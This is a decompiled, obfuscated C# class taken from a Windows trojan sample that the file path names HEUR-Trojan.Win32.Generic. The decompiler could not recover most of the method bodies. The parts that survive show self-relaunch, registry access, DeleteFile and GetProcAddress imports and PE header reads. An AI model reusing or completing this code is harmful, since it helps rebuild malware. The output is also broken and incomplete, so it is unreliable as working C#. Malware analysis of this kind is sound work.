// Decompiled with JetBrains decompiler
// Type: ClassLibrary1.ICriticalNotifyCompletion.CheckName
// Assembly: ClassLibrary1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BD89B5FB-ADA3-4778-A6F3-2882B72918D5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-0dfff5bbf6b08a68798117e7f9126d0fd9715dc6cd2b40a4e027d54f911ad0aa.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading;

namespace ClassLibrary1
{
  internal static class ICriticalNotifyCompletion\u002ECheckName
  {
    private static readonly string \u003100;
    private static readonly string \u003100;
    private static bool \u003100;
    private static readonly string \u003100;
    private static Mutex \u003100;
    internal static ICriticalNotifyCompletion\u002ECheckName.SymbolToken\u002ESetSingletonObjectMode \u003100;
    public static byte[] \u003100;
    internal static string \u003100;
    internal static bool \u003100;
    internal static string \u003100;
    internal static string \u003100;
    internal static Type[] \u003100;

    [SecuritySafeCritical]
    static ICriticalNotifyCompletion\u002ECheckName()
    {
      // ISSUE: unable to decompile the method.
    }

    public static void wQTOXLOx([In] string obj0, [In] string obj1, [In] string obj2)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void KmxKqHaU([In] Process obj0)
    {
      \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock num1 = new \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock();
      Thread thread = new Thread(new ParameterizedThreadStart(ICriticalNotifyCompletion\u002ECheckName.FdeDCBan));
      num1.Statics\u002EEnsureCapacityNamespace("-87");
      thread.IsBackground = \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock.op_Addition(num1, 52) != 0;
      thread.Start((object) obj0);
    }

    private static void vpPHnwXG([In] string obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void vqofEheq()
    {
      \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock num1 = new \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock();
      Thread thread = new Thread(new ThreadStart(ICriticalNotifyCompletion\u002ECheckName.ZZWnSWDf));
      num1.Statics\u002EEnsureCapacityNamespace("-126");
      thread.IsBackground = \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock.op_Addition(num1, 31) != 0;
      thread.Start();
    }

    private static void cUpeKjqY() => LocalDataStoreMgr\u002Eget_DefaultIcon.qwzCuTUE(ICriticalNotifyCompletion\u002ECheckName.\u003100);

    private static byte[] MFnvsXvT([In] byte[] obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static byte[] dBKVJMHI([In] byte[] obj0, [In] string obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    [DllImport("kernel32", EntryPoint = "DeleteFile", CharSet = CharSet.Unicode, SetLastError = true)]
    internal static extern bool EfZxQBgQ([In] string obj0);

    [DllImport("kernel32.dll", EntryPoint = "GetFileAttributes", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern uint pQiGWNUk([In] string obj0);

    public static string VTewjnvb()
    {
      // ISSUE: unable to decompile the method.
    }

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    public static extern IntPtr kcSKdTgO([In] string obj0);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
    public static extern IntPtr YEsICrxR([In] IntPtr obj0, [In] string obj1);

    internal static int RerSFrsW()
    {
      \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock num1 = new \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock();
      IntPtr baseAddress = Process.GetCurrentProcess().MainModule.BaseAddress;
      num1.Statics\u002EEnsureCapacityNamespace("-3");
      int num2 = Marshal.ReadInt32(baseAddress, \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock.op_Addition(num1, 37));
      num1.Statics\u002EEnsureCapacityNamespace("-123");
      int num3 = \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock.op_Addition(num1, 33);
      return Marshal.ReadInt32(baseAddress, num2 + num3);
    }

    [DllImport("advapi32.dll", EntryPoint = "GetUserName", SetLastError = true)]
    public static extern bool kRFZFFKP([In] StringBuilder obj0, [In] ref int obj1);

    internal static byte[] iaaTQHSk([In] Image[] obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static bool wVJSVYxh([In] string obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    public static bool WKlGKaCK([In] string obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    public static bool BfHDIDmZ()
    {
      // ISSUE: unable to decompile the method.
    }

    [SecuritySafeCritical]
    public static void AfQkoRjp()
    {
      // ISSUE: unable to decompile the method.
    }

    internal static void ScukDimB()
    {
      // ISSUE: unable to decompile the method.
    }

    private static void FdeDCBan([In] object obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static RegistryKey PzOCHExu([In] string obj0)
    {
      \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock num1 = new \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock();
      RegistryKey currentUser = Registry.CurrentUser;
      string name = obj0;
      num1.Statics\u002EEnsureCapacityNamespace("-66");
      int num = \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock.op_Addition(num1, 35);
      return currentUser.OpenSubKey(name, num != 0);
    }

    internal static byte[] BuNsPJUF([In] string obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void USPbyGuH([In] object obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    public static string rgVAvvpn([In] string obj0, [In] string obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void bXiVMdPO()
    {
      // ISSUE: unable to decompile the method.
    }

    internal static void uNNnJXht([In] byte[] obj0, [In] string obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static bool TilUiTJJ([In] string obj0, [In] byte[] obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void ZPjVNrAi() => ICriticalNotifyCompletion\u002ECheckName.KmxKqHaU(Process.Start(Process.GetCurrentProcess().MainModule.FileName));

    internal static bool aSaJwmpe([In] string obj0)
    {
      \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock num1 = new \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock();
      string a = obj0;
      string b = ICriticalNotifyCompletion\u002ECheckName.\u003100;
      num1.Statics\u002EEnsureCapacityNamespace("-34");
      int comparisonType = \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock.op_Addition(num1, 67);
      int num2 = string.Equals(a, b, (StringComparison) comparisonType) ? 1 : 0;
      num1.Statics\u002EEnsureCapacityNamespace("-74");
      int num3 = \u003CModule\u003E.Func`3\u002ESetCustomAttributeNoLock.op_Addition(num1, 42);
      return Convert.ToBoolean(num2 == num3);
    }

    private static void slvpVCzP([In] string obj0, [In] string obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void ZZWnSWDf()
    {
      // ISSUE: unable to decompile the method.
    }

    static string \u00318(string _param0, int _param1, int _param2)
    {
      // ISSUE: unable to decompile the method.
    }

    internal delegate Process SymbolToken\u002ESetSingletonObjectMode(string name);
  }
}
